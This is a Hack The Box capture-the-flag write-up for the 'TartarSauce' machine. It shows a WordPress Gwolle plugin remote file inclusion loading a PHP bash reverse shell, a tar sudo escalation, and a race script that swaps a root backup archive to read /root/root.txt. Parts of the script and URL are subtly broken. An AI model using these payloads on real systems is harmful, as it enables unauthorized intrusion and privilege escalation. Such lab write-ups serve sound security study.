---

title: "TartarSauce"
date: 2023-08-10T11:30:03+00:00
tags: ["web","linux","wordpres",”bash scripting”]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/TartarSauce.png"
comments: false
description: "This is a friendly linux machine that is vulnerable because the /webservices/ directory contains different types of websites, among them a wordpres which contains a vulnerable plugin."

---

## Room Information

- Room name: TartarSauce
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/tartarsauce

![Untitled](/HTB/TartarSauce.png) 

## Tools Used

- Nmap
- searchsploit
- nc
- tar
- procmon
- script.sh

## Port Scanning

Other room, other port scan.

```bash
sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.88
```

![Untitled](/HTB/escaneo-tartarsauce.png)

As you can see in this machine we can find only one port open, the port 80(http).

## Enumeration

As I always do with all machines I set out to do the directory scan with **gobuster** and **wfuzz**.

But in this case, since I didn't find much relevant information, I decided to enter the file `/robots.txt`, which contained a list of 5 urls that were out of the indexers. At first I only found one url available, which was inside the `/webservices/` directory, and it ran the service called `/monstra-3.0.4/`, in which I wasted a lot of time until I realized that it was a rabbit hole. 

![Untitled](/HTB/robots-tartarsauce.png)

![Untitled](/HTB/webmonstra-tartarsauce.png)

![Untitled](/HTB/monstra-tartarsauce.png)

Then I did a **wfuzz** on the `/webservices/` directory, to see if I could find another service that was indexed. I quickly found a `/wp/` page, so I was looking at a **wordpres** website…

So as I always do with a **wordpres** website, I did a **wpscan**, but I didn't get anything interesting. No plugin or anything. After that I had the idea that maybe the **wpscan** program was not designed for a **wordpres** page to be hosted inside a directory of a normal page. So I set out to look for it by hand with **wfuzz** and a library that I downloaded from **github** that contained the names of all the plugins and I found several.

The word-list of plugins here → https://github.com/Perfectdotexe/WordPress-Plugins-List/blob/master/plugins.txt

![Untitled](/HTB/wfuzz-tartarsauce.png)

## Exploiting

After trying to find a vulnerability in the first 2 and not finding anything, I got to the third (**gwolle**) in which I found the famous RFI, with which I could easily get a reverse shell, plus the site ran php files.

![Untitled](/HTB/gwolles-tartarsauce.png)

![Untitled](/HTB/gwolle-tartarsauce.png)

According to the vulnerability the only thing I had to do was to put the modified url and that's it, I would have RFI, and that's how it was 😎

I created a file called **wp-load.php** which contained the following:

```php
<?php
        system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>
```

Then I listened on port 443, ran the following url and got the reverse shell: 

```bash
[http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.10/](http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/shell.php)
```

Well, it is also necessary to say that I opened a **webserver** in the folder where the payload was, to be able to download it from the victim machine…

![Untitled](/HTB/pwn-tartarsauce.png)

I was in now, as **ww-data** 😇

## Treatment of tty

```bash
 script /dev/null -c bash
 ctrl + z
 stty raw -echo; fg
 restet xterm
 export TERM=xterm

```

## Escalating Privileges

The first thing I did was to see if I had permissions to enter and see any flag, but it was not the case. I had to escalate privileges if I had to.

```bash
 sudo -l
 cat /etc/crontab
 find / -perm -4000 2>/dev/null
 find / -type f -writable 2>/dev/null
 bash procmon.sh
 lsb_release -a
 uname -a
 id
 getcap -r / 2>/dev/null
 netstat -na -p tcp
 ps faux
 (try to do a cat of /.bash_history)
```

As always I started with sudo -l, and I found that I can use the program called tar as user **Onuma**, so I escalate to **Onuma** so fast doing this:

website with the commands → https://gtfobins.github.io/gtfobins/tar/#sudo

![Untitled](/HTB/tar-tartarsauce.png)

It had to be slightly modified and it is as follows:

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Now I was user **Onuma** and I could see the first flag, but still necessary to upgrade to root…

![Untitled](/HTB/proc-tartarsauce.png)

When I launched the **porcmon.sh** program I saw that the user root was running a program called **/backuperer**, so I did a cat and set out to see what it was doing.

Basically what I was doing was to see if the web page was correct and then change it for the last backup that had been made a minute ago …

To do this what I did was to compress the directory **/var/www/html** save it for about a minute and compare it with the current one to see if nothing had changed, the compressed file was always given a random name and deleted at the end of the test.

If there was an error in that test, it was changed to the last copy and the error was written in a file. So what I did was to compress the directory which they were comparing, I took it to my machine and I modified it slightly, so that the html file was a direct link to the file /root/root.txt, so when comparing it, it would not be a direct link to the file /root/root.txt.

For doing the direct link:

```bash
ln -s -f /root/root.txt index.html
```

Also I created this script that allows to hijack the compressed file and change it by my modified file…

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!]Saliendo del programa...\n"
        exit 1
}

#funcion del Ctrl
trap ctrl_c INT

while true; do
        filename = "$(ls -la /var/tmp | grep -oP '\.\w{40}')"

        if ["$filename"]; then
                echo -e "\n[+] El archivo ha sido encontrado, con nombre $filename"
                rm -f /var/tmp/$filename
                cp comprimido.tar /var/tmp/$filename
                echo -e "\n[+] El archivo ha sido cambiado correctamente..."
                exit 0
        fi

done
```

![Untitled](/HTB/script-tartarsauce.png)

After that, only rests to did a `cat /var/backups/onuma_backup_error.txt`  and see the flag.

![Untitled](/HTB/root-tartarsauce.png)

The machine was finished 😎

## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about the wordpress, and monstra.
    
- Where there any novel tools or techniques employed?
    
    Doing a direct link.
